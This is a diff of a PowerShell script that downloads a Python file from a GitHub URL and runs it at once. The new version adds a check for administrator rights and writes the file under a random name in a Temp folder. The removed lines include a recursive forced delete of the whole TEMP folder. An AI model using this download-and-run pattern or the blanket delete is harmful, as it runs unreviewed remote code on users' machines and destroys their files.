@@ -1,39 +1,29 @@
-# Descargar openpyxl manualmente
-$openpyxlURL = 'https://files.pythonhosted.org/packages/42/e8/af028681d493814ca9c2ff8106fc62a4a32e4e0ae14602c2a98fc7b741c8/openpyxl-3.1.2.tar.gz'
-$openpyxlPath = "$env:TEMP\openpyxl.tar.gz"
-Invoke-WebRequest -Uri $openpyxlURL -OutFile $openpyxlPath
+$ErrorActionPreference = "Stop"
+# Enable TLSv1.2 for compatibility with older clients
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-# Descomprimir openpyxl
-Expand-Archive -Path $openpyxlPath -DestinationPath "$env:TEMP\openpyxl"
-
-# Ruta donde se guardará el script de Python
-7z x $openpyxlPath -o"$env:TEMP\openpyxl"
-$pythonScriptPath = "$env:TEMP\script.py"
-
-# URL de tu script de Python
-$pythonScriptURL = 'https://github.com/astronomyc/filesRecents/main.py'
+$DownloadURL = 'https://github.com/astronomyc/filesRecents/main.py'
 
 try {
-    $response = Invoke-WebRequest -Uri $pythonScriptURL -UseBasicParsing
-    Set-Content -Path $pythonScriptPath -Value $response.Content
+    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
 }
 catch {
-    Write-Host "Ocurrió un error al descargar el script: $($_.Exception.Message)"
+    Write-Host "Error downloading Python script: $_"
+    Exit
 }
 
-# Añadir la ruta de openpyxl al PYTHONPATH
-$env:PYTHONPATH = "$env:TEMP\openpyxl"
+$rand = Get-Random -Maximum 99999999
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\Script_$rand.py" } else { "$env:TEMP\Script_$rand.py" }
 
-# Ruta al intérprete de Python
-$pythonPath = "C:\Path\to\python.exe"
+$content = $response.Content
+Set-Content -Path $FilePath -Value $content
 
-# Ejecutar el script de Python
 try {
-    & $pythonPath $pythonScriptPath
+    python $FilePath
 }
 catch {
-    Write-Host "Ocurrió un error al ejecutar el script: $($_.Exception.Message)"
+    Write-Host "Error executing Python script: $_"
 }
 
-# Limpiar los archivos descargados
-Remove-Item -Path $env:TEMP\* -Recurse -Force
+Remove-Item $FilePath
